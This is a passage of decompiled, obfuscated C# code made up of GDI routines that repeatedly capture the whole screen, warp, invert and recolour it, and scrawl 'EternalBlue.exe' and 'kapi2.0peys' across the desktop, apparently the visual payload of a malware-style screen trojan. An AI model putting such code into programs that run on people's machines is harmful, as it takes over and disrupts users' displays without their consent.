			A_0.DrawString(A_1, A_2, A_3, A_4, A_5);
		}

		// Token: 0x060000C0 RID: 192 RVA: 0x00002440 File Offset: 0x00000640
		static void StaticMethod7(int A_0)
		{
			Thread.Sleep(A_0);
		}
	}

	// Token: 0x02000014 RID: 20
	private class Class13 : Class6.Class34
	{
		// Token: 0x060000C1 RID: 193 RVA: 0x00006554 File Offset: 0x00004754
		public virtual void Method0(IntPtr A_1)
		{
			IntPtr intPtr = Class6.CreateCompatibleDC(A_1);
			IntPtr intPtr2 = Class6.CreateCompatibleBitmap(A_1, this.Field2, this.Field3);
			Class6.SelectObject(intPtr, intPtr2);
			Class6.BitBlt(intPtr, 0, 0, this.Field2, this.Field3, A_1, 0, 0, 13369376);
			double num = (double)(Class6.Class13.StaticMethod1(Class6.Class13.StaticMethod0()).Width / 1000);
			int num2 = Screen.PrimaryScreen.Bounds.Height / 1000;
			float num3 = 0f;
			float num4 = 0f;
			float num5 = 10f;
			float num6 = 0f;
			while ((double)num6 < num)
			{
				float num7 = (float)Math.Sin((double)num6);
				this.Field0++;
				int field = this.Field0;
				int num8 = (int)(num3 * num5 + num4);
				Class6.BitBlt(intPtr, field, num8, 1, this.Field3, intPtr, field, 0, 13369376);
				Class6.BitBlt(intPtr, field, this.Field3 + num8, 1, this.Field3, intPtr, field, 0, 13369376);
				Class6.BitBlt(intPtr, field, -this.Field3 + num8, 1, this.Field3, intPtr, field, 0, 13369376);
				if (this.Field0 >= this.Field2)
				{
					this.Field0 = 0;
				}
				num3 = num7;
				num6 += 0.001f;
			}
			Class6.BitBlt(A_1, 0, 0, this.Field2, this.Field3, intPtr, 0, 0, 13369376);
			Class6.DeleteObject(intPtr);
			Class6.DeleteObject(intPtr2);
			Thread.Sleep(this.Field1.Next(50));
		}

		// Token: 0x060000C3 RID: 195 RVA: 0x00005F6C File Offset: 0x0000416C
		static Screen StaticMethod0()
		{
			return Screen.PrimaryScreen;
		}

		// Token: 0x060000C4 RID: 196 RVA: 0x00005F80 File Offset: 0x00004180
		static Rectangle StaticMethod1(Screen A_0)
		{
			return A_0.Bounds;
		}

		// Token: 0x04000041 RID: 65
		private new int Field0;

		// Token: 0x04000042 RID: 66
		private new int Field1;
	}

	// Token: 0x02000015 RID: 21
	private class Class14 : Class6.Class34
	{
		// Token: 0x060000C5 RID: 197 RVA: 0x000066E4 File Offset: 0x000048E4
		public virtual void Method0(IntPtr A_1)
		{
			IntPtr intPtr = Class6.CreateCompatibleDC(A_1);
			IntPtr intPtr2 = Class6.CreateCompatibleBitmap(A_1, this.Field2, this.Field3);
			Class6.SelectObject(intPtr, intPtr2);
			Class6.BitBlt(intPtr, 0, 0, this.Field2, this.Field3, A_1, 0, 0, 13369376);
			for (int i = 0; i < this.Field3; i++)
			{
				Class6.BitBlt(intPtr, 0, i, this.Field2, 1, intPtr, -this.Field2 - Class6.Class14.StaticMethod0(this.Field1, -10, 11), i, 13369376);
				Class6.BitBlt(intPtr, 0, i, this.Field2, 1, intPtr, this.Field2 + Class6.Class14.StaticMethod0(this.Field1, -10, 11), i, 13369376);
				Class6.BitBlt(intPtr, 0, i, this.Field2, 1, intPtr, Class6.Class14.StaticMethod0(this.Field1, -10, 11), i, 13369376);
			}
			Class6.BitBlt(A_1, 0, 0, this.Field2, this.Field3, intPtr, 0, 0, 13369376);
			Class6.DeleteObject(intPtr);
			Class6.DeleteObject(intPtr2);
			Class6.Class14.StaticMethod2(Class6.Class14.StaticMethod1(this.Field1, 50));
		}

		// Token: 0x060000C7 RID: 199 RVA: 0x00005BF4 File Offset: 0x00003DF4
		static int StaticMethod0(Random A_0, int A_1, int A_2)
		{
			return A_0.Next(A_1, A_2);
		}

		// Token: 0x060000C8 RID: 200 RVA: 0x00005D08 File Offset: 0x00003F08
		static int StaticMethod1(Random A_0, int A_1)
		{
			return A_0.Next(A_1);
		}

		// Token: 0x060000C9 RID: 201 RVA: 0x00002440 File Offset: 0x00000640
		static void StaticMethod2(int A_0)
		{
			Thread.Sleep(A_0);
		}

		// Token: 0x04000043 RID: 67
		private new int Field0;
	}

	// Token: 0x02000016 RID: 22
	private class Class15 : Class6.Class34
	{
		// Token: 0x060000CA RID: 202 RVA: 0x00006808 File Offset: 0x00004A08
		public virtual void Method0(IntPtr A_1)
		{
			try
			{
				IntPtr intPtr = Class6.CreateCompatibleDC(A_1);
				IntPtr intPtr2 = Class6.CreateCompatibleBitmap(A_1, this.Field2, this.Field3);
				Class6.SelectObject(intPtr, intPtr2);
				Class6.BitBlt(intPtr, 0, 0, this.Field2, this.Field3, A_1, 0, 0, 13369376);
				for (int i = 0; i < 500; i++)
				{
					int num = Class6.Class15.StaticMethod0(this.Field1, -this.Field2, this.Field2 + this.Field2);
					int num2 = Class6.Class15.StaticMethod0(this.Field1, -this.Field3, this.Field3 + this.Field3);
					int a_ = Class6.Class15.StaticMethod0(this.Field1, -this.Field2, this.Field2 + this.Field2);
					int a_2 = Class6.Class15.StaticMethod0(this.Field1, -this.Field3, this.Field3 + this.Field3);
					Class6.BitBlt(intPtr, num, num2, a_, a_2, intPtr, num + Class6.Class15.StaticMethod0(this.Field1, -1, 2), num2 + Class6.Class15.StaticMethod0(this.Field1, -1, 2), 13369376);
				}
				Class6.BitBlt(A_1, 0, 0, this.Field2, this.Field3, intPtr, 0, 0, 13369376);
				Class6.DeleteObject(intPtr);
				Class6.DeleteObject(intPtr2);
				Class6.Class15.StaticMethod2(Class6.Class15.StaticMethod1(this.Field1, 10));
			}
			catch
			{
			}
		}

		// Token: 0x060000CC RID: 204 RVA: 0x00005BF4 File Offset: 0x00003DF4
		static int StaticMethod0(Random A_0, int A_1, int A_2)
		{
			return A_0.Next(A_1, A_2);
		}

		// Token: 0x060000CD RID: 205 RVA: 0x00005D08 File Offset: 0x00003F08
		static int StaticMethod1(Random A_0, int A_1)
		{
			return A_0.Next(A_1);
		}

		// Token: 0x060000CE RID: 206 RVA: 0x00002440 File Offset: 0x00000640
		static void StaticMethod2(int A_0)
		{
			Thread.Sleep(A_0);
		}

		// Token: 0x04000044 RID: 68
		private new int Field0;
	}

	// Token: 0x02000017 RID: 23
	private class Class16 : Class6.Class34
	{
		// Token: 0x060000CF RID: 207 RVA: 0x00006980 File Offset: 0x00004B80
		public unsafe virtual void Method0(IntPtr A_1)
		{
			Bitmap bitmap = new Bitmap(Class6.Class16.StaticMethod1(Class6.Class16.StaticMethod0()).Width, Screen.PrimaryScreen.Bounds.Height, PixelFormat.Format32bppArgb);
			Graphics.FromImage(bitmap).CopyFromScreen(Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y, 0, 0, Screen.PrimaryScreen.Bounds.Size, CopyPixelOperation.SourceCopy);
			Graphics graphics = Graphics.FromImage(bitmap);
			graphics.SmoothingMode = SmoothingMode.HighSpeed;
			graphics.PixelOffsetMode = PixelOffsetMode.HighSpeed;
			float num = 4f;
			Bitmap bitmap2 = (Bitmap)bitmap.Clone();
			BitmapData bitmapData = bitmap2.LockBits(new Rectangle(0, 0, bitmap2.Width, bitmap2.Height), ImageLockMode.ReadWrite, bitmap2.PixelFormat);
			int height = bitmap2.Height;
			int width = bitmap2.Width;
			for (int i = 0; i < height; i++)
			{
				byte* ptr = (byte*)((void*)bitmapData.Scan0) + i * bitmapData.Stride;
				int num2 = 0;
				for (int j = 0; j < width; j++)
				{
					byte b = ptr[num2];
					byte b2 = ptr[num2 + 1];
					int num3 = (int)((float)ptr[num2 + 2] / 255f);
					float num4 = (float)b2 / 255f;
					float num5 = (float)b / 255f;
					int num6 = ((num3 - (int)0.5f) * (int)num + (int)0.5f) * (int)255f;
					num4 = ((num4 - 0.5f) * num + 0.5f) * 255f;
					num5 = ((num5 - 0.5f) * num + 0.5f) * 255f;
					int num7 = num6;
					num7 = ((num7 > 255) ? 255 : num7);
					num7 = ((num7 < 0) ? 0 : num7);
					int num8 = (int)num4;
					num8 = ((num8 > 255) ? 255 : num8);
					num8 = ((num8 < 0) ? 0 : num8);
					int num9 = (int)num5;
					num9 = ((num9 > 255) ? 255 : num9);
					num9 = ((num9 < 0) ? 0 : num9);
					ptr[num2] = (byte)num9;
					ptr[num2 + 1] = (byte)num8;
					ptr[num2 + 2] = (byte)num7;
					num2 += 4;
				}
			}
			bitmap2.UnlockBits(bitmapData);
			Bitmap bitmap3 = new Bitmap(bitmap2);
			IntPtr hdc = Graphics.FromHdc(Class6.GetDC(IntPtr.Zero)).GetHdc();
			IntPtr intPtr = Class6.CreateCompatibleDC(hdc);
			Class6.SelectObject(intPtr, bitmap3.GetHbitmap());
			Class6.BitBlt(hdc, 0, 0, bitmap3.Width, bitmap3.Height, intPtr, 0, 0, 13369376);
			Class6.DeleteObject(hdc);
			Class6.DeleteObject(intPtr);
			Thread.Sleep(this.Field1.Next(50));
		}

		// Token: 0x060000D1 RID: 209 RVA: 0x00005F6C File Offset: 0x0000416C
		static Screen StaticMethod0()
		{
			return Screen.PrimaryScreen;
		}

		// Token: 0x060000D2 RID: 210 RVA: 0x00005F80 File Offset: 0x00004180
		static Rectangle StaticMethod1(Screen A_0)
		{
			return A_0.Bounds;
		}

		// Token: 0x04000045 RID: 69
		private new int Field0;
	}

	// Token: 0x02000018 RID: 24
	private class Class17 : Class6.Class34
	{
		// Token: 0x060000D3 RID: 211 RVA: 0x00006C38 File Offset: 0x00004E38
		public virtual void Method0(IntPtr A_1)
		{
			try
			{
				int num = Class6.Class17.StaticMethod0(this.Field1, 1, 3);
				IntPtr intPtr = Class6.CreateCompatibleDC(A_1);
				IntPtr intPtr2 = Class6.CreateCompatibleBitmap(A_1, this.Field2, this.Field3);
				Class6.SelectObject(intPtr, intPtr2);
				Graphics a_ = Class6.Class17.StaticMethod1(intPtr);
				if (num == 1)
				{
					Class6.Class17.StaticMethod6(a_, "EternalBlue.exe", Class6.Class17.StaticMethod3(Class6.Class17.StaticMethod2(), (float)Class6.Class17.StaticMethod0(this.Field1, 1, 100)), Class6.Class17.StaticMethod5(Color.FromArgb(Class6.Class17.StaticMethod4(this.Field1, 255), Class6.Class17.StaticMethod4(this.Field1, 255), Class6.Class17.StaticMethod4(this.Field1, 255))), 0f, 0f);
				}
				else if (num == 2)
				{
					Class6.Class17.StaticMethod6(a_, "kapi2.0peys", Class6.Class17.StaticMethod3(Class6.Class17.StaticMethod2(), (float)Class6.Class17.StaticMethod0(this.Field1, 1, 100)), Class6.Class17.StaticMethod5(Color.FromArgb(Class6.Class17.StaticMethod4(this.Field1, 255), Class6.Class17.StaticMethod4(this.Field1, 255), Class6.Class17.StaticMethod4(this.Field1, 255))), 0f, 0f);
				}
				Class6.StretchBlt(A_1, Class6.Class17.StaticMethod0(this.Field1, -this.Field2, this.Field2), Class6.Class17.StaticMethod0(this.Field1, -this.Field3, this.Field3), this.Field2 + Class6.Class17.StaticMethod0(this.Field1, -this.Field2, this.Field2) * 2, this.Field3 + Class6.Class17.StaticMethod0(this.Field1, -this.Field3, this.Field3) * 2, intPtr, 0, 0, this.Field2, this.Field3, CopyPixelOperation.SourceInvert);
				Class6.DeleteObject(intPtr);
				Class6.DeleteObject(intPtr2);
				Class6.Class17.StaticMethod7(Class6.Class17.StaticMethod4(this.Field1, 10));
			}
			catch
			{
			}
		}

		// Token: 0x060000D5 RID: 213 RVA: 0x00005BF4 File Offset: 0x00003DF4
		static int StaticMethod0(Random A_0, int A_1, int A_2)
		{
			return A_0.Next(A_1, A_2);
		}

		// Token: 0x060000D6 RID: 214 RVA: 0x000064E8 File Offset: 0x000046E8
		static Graphics StaticMethod1(IntPtr A_0)
		{
			return Graphics.FromHdc(A_0);
		}

		// Token: 0x060000D7 RID: 215 RVA: 0x000064FC File Offset: 0x000046FC
		new static FontFamily StaticMethod2()
		{
			return FontFamily.GenericSansSerif;
		}

		// Token: 0x060000D8 RID: 216 RVA: 0x00006510 File Offset: 0x00004710
		static Font StaticMethod3(FontFamily A_0, float A_1)
		{
			return new Font(A_0, A_1);
		}

		// Token: 0x060000D9 RID: 217 RVA: 0x00005D08 File Offset: 0x00003F08
		static int StaticMethod4(Random A_0, int A_1)
		{
			return A_0.Next(A_1);
		}

		// Token: 0x060000DA RID: 218 RVA: 0x00006524 File Offset: 0x00004724
		static SolidBrush StaticMethod5(Color A_0)
		{
			return new SolidBrush(A_0);
		}

		// Token: 0x060000DB RID: 219 RVA: 0x00006538 File Offset: 0x00004738
		static void StaticMethod6(Graphics A_0, string A_1, Font A_2, Brush A_3, float A_4, float A_5)
		{
			A_0.DrawString(A_1, A_2, A_3, A_4, A_5);
		}

		// Token: 0x060000DC RID: 220 RVA: 0x00002440 File Offset: 0x00000640
		static void StaticMethod7(int A_0)
		{
			Thread.Sleep(A_0);
		}
	}

	// Token: 0x02000019 RID: 25
	private class Class18 : Class6.Class34
	{
		// Token: 0x060000DD RID: 221 RVA: 0x00006E28 File Offset: 0x00005028
		public virtual void Method0(IntPtr A_1)
		{
			IntPtr intPtr = Class6.CreateCompatibleDC(A_1);
			IntPtr intPtr2 = Class6.CreateCompatibleBitmap(A_1, this.Field2, this.Field3);
			Class6.SelectObject(intPtr, intPtr2);
			Class6.BitBlt(intPtr, 0, 0, this.Field2, this.Field3, A_1, 0, 0, 13369376);
			double num = (double)(Class6.Class18.StaticMethod1(Class6.Class18.StaticMethod0()).Width / 10);
			double num2 = (double)(Screen.PrimaryScreen.Bounds.Height / 10);
			float num3 = 0f;
			float num4 = 0f;
			float num5 = 10f;
			float num6 = 0f;
			while ((double)num6 < num)
			{
				float num7 = (float)Math.Sin((double)num6);
				this.Field0++;
				int field = this.Field0;
				int num8 = (int)(num3 * num5 + num4);
				Class6.BitBlt(intPtr, field, num8, 1, this.Field3, intPtr, field, 0, 13369376);
				Class6.BitBlt(intPtr, field, this.Field3 + num8, 1, this.Field3, intPtr, field, 0, 13369376);
				Class6.BitBlt(intPtr, field, -this.Field3 + num8, 1, this.Field3, intPtr, field, 0, 13369376);
				if (this.Field0 >= this.Field2)
				{
					this.Field0 = 0;
				}
				num3 = num7;
				num6 += 0.1f;
			}
			float num9 = 0f;
			while ((double)num9 < num2)
			{
				float num10 = (float)Math.Sin((double)num9);
				this.Field1++;
				int field2 = this.Field1;
				int num11 = (int)(num3 * num5 + num4);
				Class6.BitBlt(intPtr, num11, field2, this.Field2, 1, intPtr, 0, field2, 13369376);
				Class6.BitBlt(intPtr, this.Field2 + num11, field2, this.Field2, 1, intPtr, 0, field2, 13369376);
				Class6.BitBlt(intPtr, -this.Field2 + num11, field2, this.Field2, 1, intPtr, 0, field2, 13369376);
				if (this.Field1 >= this.Field3)
				{
					this.Field1 = 0;
				}
				num3 = num10;
				num9 += 0.1f;
			}
			Class6.BitBlt(A_1, 0, 0, this.Field2, this.Field3, intPtr, 0, 0, 6684742);
			Class6.DeleteObject(intPtr);
			Class6.DeleteObject(intPtr2);
			Thread.Sleep(this.Field1.Next(50));
		}

		// Token: 0x060000DF RID: 223 RVA: 0x00005F6C File Offset: 0x0000416C
		static Screen StaticMethod0()
		{
			return Screen.PrimaryScreen;
		}

		// Token: 0x060000E0 RID: 224 RVA: 0x00005F80 File Offset: 0x00004180
		static Rectangle StaticMethod1(Screen A_0)
		{
			return A_0.Bounds;
		}

		// Token: 0x04000046 RID: 70
		private new int Field0;

		// Token: 0x04000047 RID: 71
		private new int Field1;
	}

	// Token: 0x0200001A RID: 26
	private class Class19 : Class6.Class34
	{
		// Token: 0x060000E1 RID: 225 RVA: 0x00007078 File Offset: 0x00005278
		public virtual void Method0(IntPtr A_1)
		{
			IntPtr intPtr = Class6.CreateCompatibleDC(A_1);
			IntPtr intPtr2 = Class6.CreateCompatibleBitmap(A_1, this.Field2, this.Field3);
			Class6.SelectObject(intPtr, intPtr2);
			Class6.BitBlt(intPtr, 0, 0, this.Field2, this.Field3, A_1, 0, 0, 13369376);
			double num = (double)(Class6.Class19.StaticMethod1(Class6.Class19.StaticMethod0()).Width / 10);
			double num2 = (double)(Screen.PrimaryScreen.Bounds.Height / 10);
			float num3 = 0f;
			float num4 = 0f;
			float num5 = 10f;
			float num6 = 0f;
			while ((double)num6 < num)
			{
				float num7 = (float)Math.Sin((double)num6);
				this.Field0++;
				int field = this.Field0;
				int num8 = (int)(num3 * num5 + num4);
				Class6.BitBlt(intPtr, field, num8, 1, this.Field3, intPtr, field, 0, 13369376);
				Class6.BitBlt(intPtr, field, this.Field3 + num8, 1, this.Field3, intPtr, field, 0, 13369376);
				Class6.BitBlt(intPtr, field, -this.Field3 + num8, 1, this.Field3, intPtr, field, 0, 13369376);
				if (this.Field0 >= this.Field2)
				{
					this.Field0 = 0;
				}
				num3 = num7;
				num6 += 0.1f;
			}
			float num9 = 0f;
			while ((double)num9 < num2)
			{
				float num10 = (float)Math.Sin((double)num9);
				this.Field1++;
				int field2 = this.Field1;
				int num11 = (int)(num3 * num5 + num4);
				Class6.BitBlt(intPtr, num11, field2, this.Field2, 1, intPtr, 0, field2, 13369376);
				Class6.BitBlt(intPtr, this.Field2 + num11, field2, this.Field2, 1, intPtr, 0, field2, 13369376);
				Class6.BitBlt(intPtr, -this.Field2 + num11, field2, this.Field2, 1, intPtr, 0, field2, 13369376);
				if (this.Field1 >= this.Field3)
				{
					this.Field1 = 0;
				}
				num3 = num10;
				num9 += 0.1f;
			}
			Class6.BitBlt(A_1, 0, 0, this.Field2, this.Field3, intPtr, 0, 0, 15597702);
			Class6.DeleteObject(intPtr);
			Class6.DeleteObject(intPtr2);
			Thread.Sleep(this.Field1.Next(50));
		}

		// Token: 0x060000E3 RID: 227 RVA: 0x00005F6C File Offset: 0x0000416C
		static Screen StaticMethod0()
		{
			return Screen.PrimaryScreen;
		}

		// Token: 0x060000E4 RID: 228 RVA: 0x00005F80 File Offset: 0x00004180
		static Rectangle StaticMethod1(Screen A_0)
		{
			return A_0.Bounds;
		}

		// Token: 0x04000048 RID: 72
		private new int Field0;

		// Token: 0x04000049 RID: 73
		private new int Field1;
	}

	// Token: 0x0200001B RID: 27
	private class Class20 : Class6.Class34
	{
		// Token: 0x060000E5 RID: 229 RVA: 0x000072C8 File Offset: 0x000054C8
		public virtual void Method0(IntPtr A_1)
		{
			IntPtr intPtr = Class6.CreateCompatibleDC(A_1);
			IntPtr intPtr2 = Class6.CreateCompatibleBitmap(A_1, this.Field2, this.Field3);
			Class6.SelectObject(intPtr, intPtr2);
			Class6.BitBlt(intPtr, 0, 0, this.Field2, this.Field3, A_1, 0, 0, 13369376);
			double num = (double)(Class6.Class20.StaticMethod1(Class6.Class20.StaticMethod0()).Width / 10);
			double num2 = (double)(Screen.PrimaryScreen.Bounds.Height / 10);
			float num3 = 0f;
			float num4 = 0f;
			float num5 = 10f;
			float num6 = 0f;
			while ((double)num6 < num)
			{
				float num7 = (float)Math.Sin((double)num6);
				this.Field0++;
				int field = this.Field0;
				int num8 = (int)(num3 * num5 + num4);
				Class6.BitBlt(intPtr, field, num8, 1, this.Field3, intPtr, field, 0, 13369376);
				Class6.BitBlt(intPtr, field, this.Field3 + num8, 1, this.Field3, intPtr, field, 0, 13369376);
				Class6.BitBlt(intPtr, field, -this.Field3 + num8, 1, this.Field3, intPtr, field, 0, 13369376);
				if (this.Field0 >= this.Field2)
				{
					this.Field0 = 0;
				}
				num3 = num7;
				num6 += 0.1f;
			}
			float num9 = 0f;
			while ((double)num9 < num2)
			{
				float num10 = (float)Math.Sin((double)num9);
				this.Field1++;
				int field2 = this.Field1;
				int num11 = (int)(num3 * num5 + num4);
				Class6.BitBlt(intPtr, num11, field2, this.Field2, 1, intPtr, 0, field2, 13369376);
				Class6.BitBlt(intPtr, this.Field2 + num11, field2, this.Field2, 1, intPtr, 0, field2, 13369376);
				Class6.BitBlt(intPtr, -this.Field2 + num11, field2, this.Field2, 1, intPtr, 0, field2, 13369376);
				if (this.Field1 >= this.Field3)
				{
					this.Field1 = 0;
				}
				num3 = num10;
				num9 += 0.1f;
			}
			Class6.BitBlt(A_1, 0, 0, this.Field2, this.Field3, intPtr, 0, 0, 8913094);
			Class6.DeleteObject(intPtr);
			Class6.DeleteObject(intPtr2);
			Thread.Sleep(this.Field1.Next(50));
		}

		// Token: 0x060000E7 RID: 231 RVA: 0x00005F6C File Offset: 0x0000416C
		static Screen StaticMethod0()
		{
			return Screen.PrimaryScreen;
		}

		// Token: 0x060000E8 RID: 232 RVA: 0x00005F80 File Offset: 0x00004180
		static Rectangle StaticMethod1(Screen A_0)
		{
			return A_0.Bounds;
		}

		// Token: 0x0400004A RID: 74
		private new int Field0;

		// Token: 0x0400004B RID: 75
		private new int Field1;
	}

	// Token: 0x0200001C RID: 28
	private class Class21 : Class6.Class34
	{
		// Token: 0x060000E9 RID: 233 RVA: 0x00007518 File Offset: 0x00005718
		public virtual void Method0(IntPtr A_1)
		{
			IntPtr intPtr = Class6.CreateCompatibleDC(A_1);
			IntPtr intPtr2 = Class6.CreateCompatibleBitmap(A_1, this.Field2, this.Field3);
			Class6.SelectObject(intPtr, intPtr2);
			Class6.BitBlt(intPtr, 0, 0, this.Field2, this.Field3, A_1, 0, 0, 13369376);
			Class6.BitBlt(intPtr, 0, 0, this.Field2, this.Field3, A_1, Class6.Class21.StaticMethod0(this.Field1, -10, 10), Class6.Class21.StaticMethod0(this.Field1, -10, 10), 4457256);
			IntPtr a_ = Class6.CreateSolidBrush((uint)Class6.Class21.StaticMethod1(Color.Blue));
			Class6.SelectObject(intPtr, a_);
			Class6.PatBlt(intPtr, 0, 0, this.Field2, this.Field3, CopyPixelOperation.PatInvert);
			Class6.BitBlt(A_1, 0, 0, this.Field2, this.Field3, intPtr, 0, 0, 13369376);
			Class6.DeleteObject(intPtr);
			Class6.DeleteObject(intPtr2);
			Class6.Class21.StaticMethod3(Class6.Class21.StaticMethod2(this.Field1, 10));
		}

		// Token: 0x060000EB RID: 235 RVA: 0x00005BF4 File Offset: 0x00003DF4
		static int StaticMethod0(Random A_0, int A_1, int A_2)
		{
			return A_0.Next(A_1, A_2);
		}

		// Token: 0x060000EC RID: 236 RVA: 0x00006380 File Offset: 0x00004580
		static int StaticMethod1(Color A_0)
		{
			return ColorTranslator.ToWin32(A_0);
		}

		// Token: 0x060000ED RID: 237 RVA: 0x00005D08 File Offset: 0x00003F08
		static int StaticMethod2(Random A_0, int A_1)
		{
			return A_0.Next(A_1);
		}

		// Token: 0x060000EE RID: 238 RVA: 0x00002440 File Offset: 0x00000640
		static void StaticMethod3(int A_0)
		{
			Thread.Sleep(A_0);
		}

		// Token: 0x0400004C RID: 76
		private new int Field0;
	}

	// Token: 0x0200001D RID: 29
	private class Class22 : Class6.Class34
	{
		// Token: 0x060000EF RID: 239 RVA: 0x0000760C File Offset: 0x0000580C
		public virtual void Method0(IntPtr A_1)
		{
			try
			{
				int num = Class6.Class22.StaticMethod0(this.Field1, 1, 3);
				IntPtr intPtr = Class6.CreateCompatibleDC(A_1);
				IntPtr intPtr2 = Class6.CreateCompatibleBitmap(A_1, this.Field2, this.Field3);
				Class6.SelectObject(intPtr, intPtr2);
				Graphics a_ = Class6.Class22.StaticMethod1(intPtr);
				if (num == 1)
				{
					Class6.Class22.StaticMethod6(a_, "EternalBlue.exe", Class6.Class22.StaticMethod3(Class6.Class22.StaticMethod2(), (float)Class6.Class22.StaticMethod0(this.Field1, 1, 100)), Class6.Class22.StaticMethod5(Color.FromArgb(Class6.Class22.StaticMethod4(this.Field1, 255), Class6.Class22.StaticMethod4(this.Field1, 255), Class6.Class22.StaticMethod4(this.Field1, 255))), (float)Class6.Class22.StaticMethod4(this.Field1, this.Field2), (float)Class6.Class22.StaticMethod4(this.Field1, this.Field3));
				}
				else if (num == 2)
				{
					Class6.Class22.StaticMethod6(a_, "kapi2.0peys", Class6.Class22.StaticMethod3(Class6.Class22.StaticMethod2(), (float)Class6.Class22.StaticMethod0(this.Field1, 1, 100)), Class6.Class22.StaticMethod5(Color.FromArgb(Class6.Class22.StaticMethod4(this.Field1, 255), Class6.Class22.StaticMethod4(this.Field1, 255), Class6.Class22.StaticMethod4(this.Field1, 255))), (float)Class6.Class22.StaticMethod4(this.Field1, this.Field2), (float)Class6.Class22.StaticMethod4(this.Field1, this.Field3));
				}
				Class6.BitBlt(A_1, 0, 0, this.Field2, this.Field3, intPtr, 0, 0, 15597702);
				Class6.DeleteObject(intPtr);
				Class6.DeleteObject(intPtr2);
				Class6.Class22.StaticMethod7(Class6.Class22.StaticMethod4(this.Field1, 10));
			}
			catch
			{
			}
		}

		// Token: 0x060000F1 RID: 241 RVA: 0x00005BF4 File Offset: 0x00003DF4
		static int StaticMethod0(Random A_0, int A_1, int A_2)
		{
			return A_0.Next(A_1, A_2);
		}

		// Token: 0x060000F2 RID: 242 RVA: 0x000064E8 File Offset: 0x000046E8
		static Graphics StaticMethod1(IntPtr A_0)
		{
			return Graphics.FromHdc(A_0);
		}

		// Token: 0x060000F3 RID: 243 RVA: 0x000064FC File Offset: 0x000046FC
		new static FontFamily StaticMethod2()
		{
			return FontFamily.GenericSansSerif;
		}

		// Token: 0x060000F4 RID: 244 RVA: 0x00006510 File Offset: 0x00004710
		static Font StaticMethod3(FontFamily A_0, float A_1)
		{
			return new Font(A_0, A_1);
		}

		// Token: 0x060000F5 RID: 245 RVA: 0x00005D08 File Offset: 0x00003F08
		static int StaticMethod4(Random A_0, int A_1)
		{
			return A_0.Next(A_1);
		}

		// Token: 0x060000F6 RID: 246 RVA: 0x00006524 File Offset: 0x00004724
		static SolidBrush StaticMethod5(Color A_0)
		{
			return new SolidBrush(A_0);
		}

		// Token: 0x060000F7 RID: 247 RVA: 0x00006538 File Offset: 0x00004738
		static void StaticMethod6(Graphics A_0, string A_1, Font A_2, Brush A_3, float A_4, float A_5)
		{
			A_0.DrawString(A_1, A_2, A_3, A_4, A_5);
		}

		// Token: 0x060000F8 RID: 248 RVA: 0x00002440 File Offset: 0x00000640
		static void StaticMethod7(int A_0)
		{
			Thread.Sleep(A_0);
		}
	}

	// Token: 0x0200001E RID: 30
	private class Class23 : Class6.Class34
	{
		// Token: 0x060000F9 RID: 249 RVA: 0x000077C8 File Offset: 0x000059C8
		public virtual void Method0(IntPtr A_1)
		{
			IntPtr intPtr = Class6.CreateCompatibleDC(A_1);
			IntPtr intPtr2 = Class6.CreateCompatibleBitmap(A_1, this.Field2, this.Field3);
			Class6.SelectObject(intPtr, intPtr2);
			Class6.BitBlt(intPtr, 0, 0, this.Field2, this.Field3, A_1, 0, 0, 13369376);
			double num = (double)(Class6.Class23.StaticMethod1(Class6.Class23.StaticMethod0()).Width / 100);
			int num2 = Screen.PrimaryScreen.Bounds.Height / 100;
			float num3 = 0f;
			float num4 = 0f;
			float num5 = 5f;
			float num6 = 0f;
			while ((double)num6 < num)
			{
				float num7 = (float)Math.Sin((double)num6);
				this.Field0++;
				int field = this.Field0;
				int num8 = (int)(num3 * num5 + num4);
				Class6.BitBlt(intPtr, field, num8, 1, this.Field3, intPtr, field, 0, 13369376);
				Class6.BitBlt(intPtr, field, this.Field3 + num8, 1, this.Field3, intPtr, field, 0, 13369376);
				Class6.BitBlt(intPtr, field, -this.Field3 + num8, 1, this.Field3, intPtr, field, 0, 13369376);
				if (this.Field0 >= this.Field2)
				{
					this.Field0 = 0;
				}
				num3 = num7;
				num6 += 0.01f;
			}
			Class6.BitBlt(A_1, 0, 0, this.Field2, this.Field3, intPtr, 0, 0, 13369376);
			Class6.DeleteObject(intPtr);
			Class6.DeleteObject(intPtr2);
			Thread.Sleep(this.Field1.Next(50));
		}

		// Token: 0x060000FB RID: 251 RVA: 0x00005F6C File Offset: 0x0000416C
		static Screen StaticMethod0()
		{
			return Screen.PrimaryScreen;
		}

		// Token: 0x060000FC RID: 252 RVA: 0x00005F80 File Offset: 0x00004180
		static Rectangle StaticMethod1(Screen A_0)
		{
			return A_0.Bounds;
		}

		// Token: 0x0400004D RID: 77
		private new int Field0;

		// Token: 0x0400004E RID: 78
		private new int Field1;
	}

	// Token: 0x0200001F RID: 31
	private class Class24 : Class6.Class34
	{
		// Token: 0x060000FD RID: 253 RVA: 0x00007954 File Offset: 0x00005B54
		public virtual void Method0(IntPtr A_1)
		{
			IntPtr intPtr = Class6.CreateCompatibleDC(A_1);
			IntPtr intPtr2 = Class6.CreateCompatibleBitmap(A_1, this.Field2, this.Field3);
			Class6.SelectObject(intPtr, intPtr2);
			Class6.BitBlt(intPtr, 0, 0, this.Field2, this.Field3, A_1, 0, 0, 13369376);
			double num = (double)(Class6.Class24.StaticMethod1(Class6.Class24.StaticMethod0()).Width / 100);
			int num2 = Screen.PrimaryScreen.Bounds.Height / 100;
			float num3 = 0f;
			float num4 = 0f;
			float num5 = 10f;
			float num6 = 0f;
			while ((double)num6 < num)
			{
				float num7 = (float)Math.Sin((double)num6);
				this.Field0++;
				int field = this.Field0;
				int num8 = (int)(num3 * num5 + num4);
				Class6.BitBlt(intPtr, field, num8, 1, this.Field3, intPtr, field, 0, 13369376);
				Class6.BitBlt(intPtr, field, this.Field3 + num8, 1, this.Field3, intPtr, field, 0, 13369376);
				Class6.BitBlt(intPtr, field, -this.Field3 + num8, 1, this.Field3, intPtr, field, 0, 13369376);
				if (this.Field0 >= this.Field2)
				{
					this.Field0 = 0;
				}
				num3 = num7;
				num6 += 0.01f;
			}
			Class6.BitBlt(A_1, 0, 0, this.Field2, this.Field3, intPtr, 0, 0, 15597702);
			Class6.DeleteObject(intPtr);
			Class6.DeleteObject(intPtr2);
			Thread.Sleep(this.Field1.Next(50));
		}

		// Token: 0x060000FF RID: 255 RVA: 0x00005F6C File Offset: 0x0000416C
		static Screen StaticMethod0()
		{
			return Screen.PrimaryScreen;
		}

		// Token: 0x06000100 RID: 256 RVA: 0x00005F80 File Offset: 0x00004180
		static Rectangle StaticMethod1(Screen A_0)
